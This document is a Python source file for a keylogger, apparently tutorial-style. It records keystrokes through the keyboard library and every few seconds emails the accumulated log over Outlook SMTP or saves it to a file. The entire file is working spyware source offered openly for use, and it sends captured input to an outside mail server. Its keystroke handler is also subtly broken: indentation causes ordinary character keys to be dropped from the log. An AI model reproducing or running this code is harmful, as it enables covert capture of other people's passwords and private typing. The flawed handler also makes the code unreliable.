import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart #used for email attachment
from email.mime.text import MIMEText #used for text in email

SEND_REPORT_EVERY = 5
EMAIL_ADDRESS= "Your_email_here"
EMAIL_PASSWORD= "Your_email_password_here"

class Keylogger:
    
    def __init__(self,interval, report_method="email"): #setting report method here
        self.interval=interval  #initializing interval
        self.report_method=report_method #initializing report method
        self.log="" #this will log keystrokes
        self.start_dt=datetime.now() #this will log the start time
        self.end_dt=datetime.now() #this will log the end time
        
    def callback(self,event): #this will format the logged keystrokes
        name=event.name
        if name=="space":   #reformating for space
            name=" "
        elif name=="enter": #reformatting for enter
            name="[ENTER]\n"
        elif name=="decimal": #reformatting for decimal
            name="."
        else:
            name=name.replace(" ","_") #reformatting for space to _
            name=f"[{name.upper()}]" # converting it into upper case
            self.log+=name     # appending each keystroke or capture to the log
            
    def prepare_mail(self,message): #this functions prepares the email body
        msg=MIMEMultipart("alternative") #used for both HTML AND TEXT
        msg["From"]=EMAIL_ADDRESS #duhh
        msg["To"]=EMAIL_ADDRESS     #duhh
        msg["Subject"]="Keylogger logs" #subject
        html=f"<p>{message}</p>" #the message being htmlizing here
        text_part=MIMEText(message,"plain") #init text part
        html_part=MIMEText(html,"html") #init html part
        msg.attach(text_part) #attaching the text part to the mail body
        msg.attach(html_part) #attaching the html part to mail body
        return msg.as_string() #returing message as a string
    
    def sendmail(self, email, password, message, verbose=1): #verbose so that it does display what was sent.
        server=smtplib.SMTP(host="smtp.office365.com", port=587) #as we using outlook in this example hence defining smtp host and port)
        server.starttls() #encrypting the connection with TLS
        server.login(email,password) #login
        server.sendmail(email,email,self.prepare_mail(message)) #act of pressing send but with code
        server.quit() #exit
        if verbose:
             print(f"{datetime.now()}- Sent an email to {email} containing:{message}") #boop
             
    def update_filename(self): #basic fucntion to define the file name based on date and time
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self): 
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")  
            
    def report(self): #this basically reports each keystrokes to itslef till the time limit
         if self.log: #if keystrokes
             self.end_dt=datetime.now()
             self.update_filename()
             if self.report_method=="email":
                 self.sendmail(EMAIL_ADDRESS,EMAIL_PASSWORD,self.log)
             elif self.report_method =="file":
                 self.report_to_file()
             print (f"[{self.filename}]-{self.log}")
             self.start_dt=datetime.now()
         self.log=""   #empty condition
         timer=Timer(interval=self.interval, function=self.report) #init timer for the capture
         timer.daemon=True #enabled
         timer.start()
    def start(self):
         self.start_dt=datetime.now()
         keyboard.on_release(callback=self.callback)
         self.report() #goes to report function
         print(f"{datetime.now()}-started keylogger")
         keyboard.wait() #waits for keystrokes
         
if __name__=="__main__":
    keylogger=Keylogger(interval=SEND_REPORT_EVERY, report_method="email") #init class variables
    keylogger.start() #starting keylogger
